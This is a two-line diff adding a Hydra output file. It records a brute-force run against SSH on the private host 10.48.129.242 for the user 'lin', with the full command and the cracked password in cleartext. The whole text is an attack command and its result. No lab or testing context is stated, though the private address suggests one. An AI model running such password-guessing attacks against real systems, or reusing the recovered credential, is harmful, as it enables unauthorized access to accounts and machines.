@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-09-26 19:39:58 on 10.48.129.242 ssh (hydra -l lin -P ./locks.txt -t 4 -o hydra_ssh_lin.txt 10.48.129.242 ssh)
+[22][ssh] host: 10.48.129.242   login: lin   password: RedDr4gonSynd1cat3
